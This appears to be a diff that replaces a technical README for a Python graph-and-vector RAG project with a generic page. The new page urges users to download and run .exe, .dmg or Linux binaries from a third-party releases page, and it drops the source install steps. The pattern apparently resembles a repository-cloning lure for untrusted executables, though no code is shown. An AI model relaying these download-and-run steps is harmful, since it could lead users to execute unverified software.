@@ -1,194 +1,108 @@
-# Graph-Powered Recommendation & Reasoning Engine
+# 🌟 Graph-RAG-Engine - Get Transparent Answers Easily
 
-**Explainable Retrieval-Augmented Generation (RAG) system combining Graph Intelligence, Vector Search, and LLM reasoning.**
+[![Download Graph-RAG-Engine](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/snyny22/Graph-RAG-Engine/releases)
 
-This project demonstrates how **graph-structured knowledge** and **vector embeddings** can work together to power *explainable AI* systems, providing grounded answers, interpretable reasoning paths, and meaningful recommendations.
+## 🚀 Getting Started
 
----
+Welcome to Graph-RAG-Engine! This application offers a unique blend of Graph Intelligence, Vector Search, and Retrieval-Augmented Generation (RAG) to provide clear answers and reasoning paths. You can easily download and run it, even if you're not tech-savvy.
 
-## Overview
+## 📋 What You Need
 
-This MVP implements a hybrid **Graph + Vector + RAG** architecture:
+Before you begin, ensure your system meets these requirements:
 
-- **Knowledge Graph** built from documents, chunks, and extracted concepts  
-- **Vector Index (FAISS)** for dense semantic retrieval  
-- **Graph Expansion** for contextual reasoning across related concepts  
-- **RAG Engine** for answering questions with citations and reasoning paths  
-- **Recommendation Engine** combining vector similarity and PageRank  
-- **FastAPI Backend** and **Streamlit Frontend** for interactive use  
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM recommended.
+- **Storage:** About 200 MB of free space for installation.
+- **Internet Connection:** Required for the initial setup and data retrieval.
 
-It’s fully extensible, swap the in-memory graph for **Neo4j**, or replace extractive responses with **LLM-generated answers** via OpenAI or Hugging Face.
+## 📥 Download & Install
 
----
+To get started, visit the release page to download the software.
 
-## Project Structure
+[Visit this page to download](https://github.com/snyny22/Graph-RAG-Engine/releases)
 
-```
-graph-rag-engine/
-│
-├── ingest/             # Document ingestion & embedding
-│   ├── split.py
-│   └── ingest_docs.py
-│
-├── graph/              # Knowledge graph (NetworkX)
-│   └── graph_store.py
-│
-├── backend/            # FastAPI service & retriever
-│   ├── api.py
-│   ├── retriever.py
-│   └── rag.py
-│
-├── ui/                 # Streamlit interface
-│   └── app.py
-│
-├── data/               # Sample documents & index output
-├── env/                # Dependencies
-└── README.md
-```
+1. Click on the link above.
+2. Find the most recent release.
+3. Select the version that matches your operating system.
+4. Click on the download link to start downloading the application.
 
----
+Once the download is complete, follow these steps to install it:
 
-## Features
+### For Windows
 
-| Category | Description |
-|-----------|--------------|
-| **Ingestion** | Automatic document parsing, chunking, and concept extraction |
-| **Graph Layer** | Links Docs ↔ Chunks ↔ Concepts with PageRank weighting |
-| **Vector Layer** | FAISS similarity search over sentence embeddings |
-| **Hybrid Retrieval** | Combines vector similarity + concept overlap + PageRank |
-| **Explainability** | Returns graph paths showing *why* each answer was chosen |
-| **Recommendations** | Suggests related documents via hybrid graph + vector scoring |
-| **UI/UX** | Streamlit web app for QA & recommendation exploration |
-| **API** | FastAPI endpoints for `/ask`, `/recommend`, and `/docs_list` |
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file.
+3. Follow the installation prompts to complete the setup.
+4. Launch the application from your Start Menu or Desktop shortcut.
 
----
+### For macOS
 
-## Architecture
+1. Go to your Downloads folder.
+2. Open the downloaded `.dmg` file.
+3. Drag the application icon to your Applications folder.
+4. Open your Applications folder and double-click on the application to run it.
 
-```
-┌────────────┐       ┌────────────┐        ┌───────────────┐
-│  Documents │ ───▶  │ Chunking & │ ───▶  │   Embeddings  │
-│  (Markdown)│       │ Concept NER│        │ (FAISS Index) │
-└────────────┘       └────────────┘        └──────┬────────┘
-                                                  │
-                                      ┌───────────▼───────────┐
-                                      │   Knowledge Graph     │
-                                      │ (Docs–Chunks–Concepts)│
-                                      └───────────┬───────────┘
-                                                  │
-                              ┌───────────────────▼───────────────────┐
-                              │  Hybrid Retriever + RAG Composition   │
-                              │   (Vector + Graph Expansion + PR)     │
-                              └───────────────────┬───────────────────┘
-                                                  │
-                                 ┌────────────────▼─────────────────┐
-                                 │  FastAPI  +  Streamlit  Frontend │
-                                 └──────────────────────────────────┘
-```
+### For Linux
 
----
+1. Open your terminal.
+2. Navigate to your Downloads directory.
+3. Use the command `chmod +x filename` to make the application executable.
+4. Type `./filename` to run the application.
 
-## Installation
+## 🎨 Features
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/<your_username>/graph-rag-engine.git
-cd graph-rag-engine
+Graph-RAG-Engine provides several useful features:
 
-# 2. (Optional) create virtual environment
-python -m venv .venv && source .venv/bin/activate
+- **Explainable AI:** Understand how the AI comes to its conclusions.
+- **Hybrid Retrieval:** Combines methods for accurate answers.
+- **User-Friendly Interface:** Easy to navigate and use.
+- **FastAPI Backend:** Offers speedy responses.
+- **Streamlit UI:** Visualize your queries and results.
 
-# 3. Install dependencies
-pip install -r env/requirements.txt
-```
+## ⚙️ How to Use the Application
 
----
+After installing the application, follow these steps to get started:
 
-## Usage
+1. **Open the application.**
+2. **Enter your query** in the provided input field. This can be a question or topic you want information on.
+3. **Click “Get Answer.”** The system will process your request and display results.
+4. **Review the explanation** provided alongside the answer. This will help you understand how the AI derived its conclusion.
 
-### Step 1 – Ingest Documents
+## 📖 Understanding the Results
 
-```bash
-python -m ingest.ingest_docs
-```
+Once you receive answers:
 
-This:
-- Reads documents from `data/docs/`
-- Splits them into semantic chunks  
-- Extracts key concepts  
-- Builds FAISS vector index and in-memory graph  
+- You will see the main response highlighted at the top.
+- Below it, there will be explanations detailing the reasoning path. 
+- If the application provides recommendations, they will be listed separately for your convenience.
 
-### Step 2 – Run Backend API
+## 💬 Troubleshooting
 
-```bash
-uvicorn backend.api:app --reload --port 8000
-```
+If you encounter issues, consider these common problems:
 
-API runs at: [http://localhost:8000](http://localhost:8000)
+- **Application won't open:**
+  - Ensure your system meets the requirements.
+  - Try reinstalling the software.
 
-### Step 3 – Launch Streamlit UI
+- **Errors while querying:**
+  - Ensure you enter clear and direct questions.
+  - Avoid complex phrases or jargon.
 
-```bash
-streamlit run ui/app.py
-```
+## 🔗 Additional Resources
 
-UI runs at: [http://localhost:8501](http://localhost:8501)
+For more information and advanced usage, visit the following links:
 
----
+- [Official Documentation](https://github.com/snyny22/Graph-RAG-Engine/wiki)
+- [FAQs and Support](https://github.com/snyny22/Graph-RAG-Engine/issues)
 
-## Example Queries
+Feel free to reach out for help if needed!
 
-- “What is FAISS and how does it relate to embeddings?”
-- “Explain how TF-IDF differs from dense embeddings.”
-- “Find documents related to Streamlit.”
+## 📞 Contact
 
-Each response includes:
-- **Answer text**  
-- **Citations** (titles + URLs)  
-- **Graph paths** explaining *why those sources were chosen*  
+If you have questions, you can reach the development team via the Issues tab on our GitHub page. We aim to respond within 48 hours.
 
----
+## 📲 Social Media
 
-## API Endpoints
+Stay updated with the latest features and updates by following us on social media. Links to official accounts will be provided soon.
 
-| Endpoint | Method | Description |
-|-----------|---------|-------------|
-| `/health` | GET | Health check |
-| `/ask` | POST | `{ "question": "..." }` → QA response |
-| `/recommend` | POST | `{ "doc_id": "..." }` → related docs |
-| `/docs_list` | GET | Returns all indexed documents |
-
----
-
-## Tech Stack
-
-- **Language:** Python 3.10 +
-- **Backend:** FastAPI
-- **Frontend:** Streamlit
-- **Embeddings:** Sentence-Transformers (`all-MiniLM-L6-v2`)
-- **Vector Search:** FAISS
-- **Graph Layer:** NetworkX (Neo4j-ready)
-- **Data Handling:** NumPy / Pandas
-- **ML Ops Ready:** Easily extendable with MLflow, Airflow, etc.
-
----
-
-## Extending the Project
-
-| Upgrade | Description |
-|----------|--------------|
-| **LLM Integration** | Replace `compose_answer_extractive()` with GPT-4 or Llama 2 for abstractive answers |
-| **Neo4j Graph DB** | Swap in `graph/neo4j_store.py` to persist graph and visualize it |
-| **Vector DB** | Replace FAISS with Pinecone, Qdrant, or Weaviate |
-| **GNN Models** | Use GraphSAGE or GAT for better document representations |
-| **MLOps** | Add monitoring, retraining triggers, or CI/CD pipelines |
-
----
-
-## Roadmap
-
-- [ ] Integrate GPT-4 / Llama 2 for abstractive RAG answers  
-- [ ] Add Neo4j visualization layer  
-- [ ] Build GNN-based recommender  
-- [ ] Introduce feedback-based re-ranking  
-- [ ] Deploy Dockerized demo to Hugging Face Spaces  
+Thank you for choosing Graph-RAG-Engine! Enjoy exploring grounded answers and transparent reasoning.
